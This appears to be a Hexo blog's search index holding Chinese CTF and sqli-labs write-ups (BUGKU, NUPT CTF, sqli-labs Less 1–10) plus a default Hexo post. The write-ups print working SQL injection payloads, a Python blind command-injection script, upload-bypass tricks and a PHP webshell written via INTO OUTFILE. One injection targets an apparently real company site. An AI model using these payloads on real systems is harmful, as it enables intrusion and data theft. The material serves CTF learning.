<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[BUGKU]]></title>
    <url>%2F2018%2F09%2F29%2FBUGKU%2F</url>
    <content type="text"><![CDATA[Web 速度要快查看源码提示需要post参数margin带查找到的值，抓包发现flag参数 never give up进入发现页面只有一句话，查看源代码发现1p.html，访问发现页面出现跳转，抓包查看发现大段字符串 先base64解码，再url解码发现php代码段 1234567891011121314151617181920212223";if(!$_GET['id']) &#123; header('Location: hello.php?id=1'); exit(); &#125; $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.')) &#123; echo 'no no no no no no no'; return ; &#125; $data = @file_get_contents($a,'r'); if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) &#123; require("f4l2a3g.txt"); &#125; else &#123; print "never never never give up !!!"; &#125;?&gt; 这题有个bug直接访问文件就可以得到flag sql注入2注入半天也没注出什么，参考了一下writeup知道是ds_store源码泄露，运行ds_store源码读取脚本，运行后如下 （附上脚本地址： https://pypi.org/project/ds_store/1.1.0/） 发现有flag文件，脚本会自动下载文件到本地，打开flag文件得到flag login2(SKCTF)进入后出现登录界面，首先尝试用万能密码登录无果； 抓包发现响应包里有tip base64解码 123$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123;&#125; 登录的流程为： 1.根据输入的用户名查询出用户名和口令 2.对比输入的口令的md5值和查询出的口令是否相等 接下来构造payload： username: &apos; union select null,&apos;c4ca4238a0b923820dcc509a6f75849b&apos; # // &apos;闭合前面的查询语句，使使查询语句结果的password永远返回1的md5值 password: 1 成功登录后进入远程监控系统，尝试了各种命令执行绕过发现这里可以通过执行sleep函数来进行命令盲注（此处参考了一些writeup） 构造payload： postdata： c=123;a=`ls`;b=&quot;a&quot;;if [ ${a:0:1} == $b ];then sleep 2;fi //读取目录 这里自己用python写了个脚本，贴上代码（本人是新手，写的比较粗糙）,首先跑出目录，会发现有flag字样的txt文件，在用脚本读取出文件内容发现flag 1234567891011121314151617181920import requestsstri='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, 'url='http://123.206.31.85:49165/index.php'data_post= &#123;'c':'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'&#125;cookies=&#123;'PHPSESSID':'hbccmcbln7ul8lc0hgh2q9rrg4'&#125; #登录成功后拿取cookieresult = ''for x in range(0,50): for y in stri: # 查看目录 data_post['c'] = "c=123;a=`ls`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi" # # 查看文件内容 #data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi" print(data_post) r = requests.post(url,data=data_post,cookies=cookies) time = r.elapsed.seconds if time&gt;1: result += y break print(result) WEB进阶实战2-注入转了一会发现about菜单的news界面可能存在注入点，访问http://www.kabelindo.co.id/readnews.php?id=25 and 1=2发现页面返回异常确认注入点。 payload： ?id=25 order by 5 //确认列数 ?id=125 union select 1,substr((group_concat(table_name)),100,150),3,4,5 from information_schema.tables where table_schema=database() //获取最后一个表名提交]]></content>
      <categories>
        <category>Web-Security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NYCtf]]></title>
    <url>%2F2018%2F09%2F26%2FNYCtf%2F</url>
    <content type="text"><![CDATA[南邮ctf(无图)签到题查看页面源代码就ok了 md5 collision看题目知道是md5碰撞，只需要找到另一串md5加密后为0x开头的字符 签到2输入发现有字符长度限制，F12打开调试界面修改input的maxlength 这题不是WEB绕了一圈什么也没发现，数据包也没发现异常，猜测图片做了手脚，保存到本地用winhex查看，发现末尾出现flag AAencode页面上显示的时js颜文字，直接复制到F12后出现控制台回车得到flag，如果页面显示乱码，先调整浏览器的编码为unicode 单身二十年抓包得到flag php decode这题在网上搜了一些资料，方法就是把eval修改为echo就能输出flag 文件包含点击链接发现参数file用php伪协议读取index.php文件发现一串base64加密后的字符串解密后发现flag 单身一百年也没用依旧通过抓包发现flag COOKIE抓包发现cookie中有login参数值为0，TIP: 0==not，修改为1返回flag MYSQL根据页面提示查看robots.txt文件，发现php代码片段，根据提示在sql.php页面提交id参数，判断需要提交的id值为1024，这里利用了intval()方法的一个特性，intval()方法处理浮点数时会忽略后面的小数部分，这样在查询数据库时id为1024，而进行比较时为1024和1024.xxx作比较达到绕过的目的 GBK Injection题目提示为宽字节注入 payload： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27 order by 2 %23 确定有两列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 发现有多张表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 逐个表查询列名，这里有一点需要注意的是，表名处无法绕过引号转译，就替换为16进制依然能达到绕过 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27 union select 1,flag from ctf4 %23 最后查询到flag /x00题目提示有多种解法，首先想到的是利用数组进行绕过 payload： http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=123 另一种方法是通过ereg函数的漏洞：%00截断 payload： http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=123%00%23biubiubiu 可能存在别的方法目前还没了解到 bypass againmd5加密后为0x的开头的字符串会被认为是相同的，可以构造如下payload http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO 或者使用数组绕过，payload http://chinalover.sinaapp.com/web17/index.php?a[]=123&amp;b[]=234 变量覆盖页面提供了源代码链接，进入查看代码审计构造data数据 pass=1&amp;thepassword_123=1 达到覆盖原变量值的目的，得到flag 上传绕过上传图片文件提示需要上传php文件，上传php文件提示需要上传图片文件抓包查看响应包中的内容，做出如下判断： 1.判断上传文件的后缀是否为图片常用后缀 2.判断上传路径中的文件后缀是否为php后缀 在上传路径中利用%00截断漏洞实现绕过：/uploads/1.php%00，这里%00还需要进行url编码，或者直接进入hex界面修改相应位置为00，发送后返回flag SQL注入1查看源码构造payload： 账号为：admin’) #密码为任意得到flag pass check检查题目提供的源码先使用数组成功绕过得到flag 密码重置发现链接中有base64之后的值，转换后发现是用户名，修改为admin做base64post添加以下参数：user=admin&amp;newpass=123&amp;vcode=1234提交返回flag 综合题打开页面发现是一串jsfuck，复制到控制台页面返回1bc29b36f623ba82aaf6724fd3b16718.php访问此文件出现：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里抓包发现响应包中的提示：history of bash查了一下资料，需要访问这个文件 .bash_history发现一个命令行，发现flagbak.zip，下载解压后发现flag ###sql注入2 查看提供的源码 123456789101112131415&lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); //根据输入的用户名查找用户口令 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; //判断查询出的用户口令是否和用户输入的口令的md5值相等 echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125; &#125;?&gt; postdate： user=&apos; union select &apos;c4ca4238a0b923820dcc509a6f75849b //使查询语句返回为1的md5值 pass=1 file_get_contents进入后页面空白，查看源代码发现代码段，通过php伪协议php://input读取数据流payload： view-source:http://chinalover.sinaapp.com/web23/?file=php://inputdata： meizijiu返回flag 变量覆盖右键查看源代码，构造payload：view-source:http://chinalover.sinaapp.com/web24/?name=meizijiu233返回flag]]></content>
      <categories>
        <category>Web-Security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs解题思路]]></title>
    <url>%2F2018%2F07%2F06%2Fsql-labs%2F</url>
    <content type="text"><![CDATA[1-10/解题思路Less-1 GET-Error based-Single quotes-String首先是正常的查询界面 输入单引号可以看到报错信息，根据报错信息可以知道输入的id被单引号包裹，接下来猜字段。 order by后的数字大于3的时候页面会返回报错信息，也就是表里有3个字段。 这里的 %23 是 # 的url编码，用于注释。 接下来构造联合查询语句，这里页面没有变化的原因是后台只显示返回的查询结果的第一条记录。 可以让联合查询的左边查询结果为空，那么就会显示右边的查询结果 接下来就可以利用各种数据库函数查看数据库信息。 接下来爆表名，构造下面的语句,这里后台会限制查询结果的显示个数，所以利用了 group_concat() 函数 ?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23 接下来就继续爆列名，这里以 users 表为例，构造下列语句。 ?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; %23 然后构造下面的语句可以查询到所有用户的信息 ?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users %23 Less-2 GET-Error based-Intiger based输入单引号可以看到报错信息，可以判断为数字型注入 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-3 GET-Error based-Single with twist-String 添加单引号页面返回报错信息，可以知道 id 被 (&apos;&apos;) 包裹 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-4 GET-Error based-Double quotes-String 添加双引号页面返回报错信息，id 被 (&quot;&quot;) 包裹 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-5 GET-Double injection-Single quotes-String道题我的思路是盲注，之后参考了一下别人的writeup知道是双查询注入，题目也是提示，然后了解了一下双查询注入是有固定的语句： ?id=1&apos; union select count(*),2,concat((select database()),floor(rand()*2))a from information_schema.tables group by a %23 database()可以替换成需要查询的数据 标题有提示是单引号，然后判断字段数为3 然后使用双查询注入，这里报错显示的security0去掉后面的0就是当前使用的数据库名 接着爆表名，这里直接查询表名会出现以下报错信息，需要用limit限定范围 接着爆列名，同上。 爆数据 Less-6 GET-Double injection-Double quotes-String和上一题的步骤一样，但是要把单引号替换为双引号。 Less-7 GET-Dump into outfile-String这题看了一下源码和别人的思路。 先在之前的关卡获取到数据库的路径：@@basedir获取mysql的安装路径，@@datadir获取mysql的数据路径 网站的根目录就是 &apos;C:/phpStudy/PHPTutorial/WWW/&apos; 这里执行后会发现文件并没有写入目录，查了一下资料是因为缺少权限： mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本都默认为空，之后都为null，null为禁用数据的导入导出，空为变量无效。 查看secure_file_priv全局系统变量 为了测试把修改本地的my.ini文件并重启服务 构造如下语句： ?id=1&apos;)) union select 1,database(),user() into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test.txt&apos; %23 执行后页面会如图显示 但是查看www目录，可以看到生成了test.txt文件 构造下面的语句导出users表数据 ?id=1&apos;)) union select 1,group_concat(username),group_concat(password) from users into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test2.txt&apos; %23 然后可以写入一句话木马 ?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&apos; %23 Less-8 GET-Blind-Boolian based-Single quotes这题是布尔盲注，查询为空时页面会不同 猜测字段为3 用二分法爆表名 1234567891011121314151617?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 %23 返回正常页面?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 %23 返回异常页面，第一张表名的长度为6?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23 返回正常页面?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101 %23 返回异常页面，第一位是 e?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 返回正常页面?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 返回异常页面，第二位是 m剩余4位同上。 爆users表字段 123456789101112?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))&gt;7 %23 返回正常页面?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))&gt;8 %23 返回异常页面，users表第二个字段名长度为8?id=1' and ascii(mid((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))&gt;116 %23 返回正常页面?id=1' and ascii(mid((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))&gt;117 %23 返回异常页面，第一位是 u剩余位数同上。之后就可以爆数据了。原理同上。 Less-9 GET-Blind-Time based-Single quotes这题是时间盲注，无论输入什么参数页面都不会变化。 1234567891011121314爆第一张表?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6,1,sleep(4)) %23页面延迟较长时间返回?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5,1,sleep(4)) %23页面在正常时间内返回，判断表名长度为6?id=1' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101,1,sleep(4)) %23页面延迟返回?id=1' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,1,sleep(4)) %23页面正常返回，第一位的ascii码为101，也就是 e剩余位数同上。 Less-10 GET-Blind-Time based-Double quotes和上一题的步骤一样，但是要把单引号替换为双引号。 11-20/解题思路###11关]]></content>
      <categories>
        <category>Web-Security</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F03%2F15%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
